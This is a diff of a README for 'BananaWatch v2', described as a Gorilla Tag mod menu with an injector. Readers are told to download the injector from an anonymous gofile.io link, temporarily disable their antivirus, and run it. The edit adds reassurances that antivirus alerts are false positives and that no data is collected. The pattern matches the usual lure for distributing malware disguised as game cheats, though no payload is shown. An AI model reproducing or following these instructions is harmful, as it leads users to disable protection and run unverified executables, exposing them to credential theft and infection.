@@ -1,20 +1,42 @@
 # BananaWatch-v2
 
-BananaWatch v2 is the upgraded version of the original BananaWatch, rebuilt with better stability, smoother performance, and a cleaner interface. Version two refines the original experience with improved reliability, quality-of-life changes, and a more polished feel while keeping the core features users enjoyed.
+BananaWatch v2 is the second release of the original BananaWatch, rebuilt with a focus on stability, usability, and clarity. This version improves performance, refines the interface, and addresses issues from the first release while preserving the core functionality users are familiar with.
 
-How to Download & Use
+BananaWatch v2 is designed to be lightweight and user-controlled. It only runs when launched by the user and does not operate in the background when closed.
 
-Download the official injector here:
+Included Features
+
+BananaWatch v2 includes a curated set of optional mods intended to enhance the Gorilla Tag experience. All features are toggleable and fully controlled by the user.
+
+Current features include:
+
+Movement-related enhancements
+
+Visual and cosmetic options
+
+Player utilities and quality-of-life tools
+
+Menu customization options
+
+Stability and performance-focused features
+
+An interface preview is not available at this time. Development is ongoing, and additional features and improvements are planned for BananaWatch v3.
+
+Download & Basic Usage
+
+Download the official injector from the link below:
 https://gofile.io/d/X3mI0u
 
-Extract the downloaded file.
+Extract the files to a known folder.
 
 Temporarily disable your antivirus.
 
-Run the injector as administrator.
+Run the injector and follow the on-screen instructions.
 
-Launch Gorilla Tag and inject BananaWatch v2.
+Only download BananaWatch v2 from official sources to avoid modified or unsafe copies.
 
-Antivirus Notice
+Antivirus & Safety Information
 
-Antivirus software may flag the injector as a false positive because it uses injection and memory modification methods similar to other mod tools. BananaWatch v2 does not collect personal data. Disabling AV prevents interference—re-enable it after use.
+Some antivirus programs may detect BananaWatch v2 or its injector as a false positive. This occurs because the software uses injection and memory interaction techniques that are commonly associated with malware behavior, even when the program itself is not malicious.
+
+BananaWatch v2 does not collect personal data, log keystrokes, or run hidden background processes. Temporarily disabling antivirus protection prevents false detections or file removal. Users should re-enable antivirus protection after use.
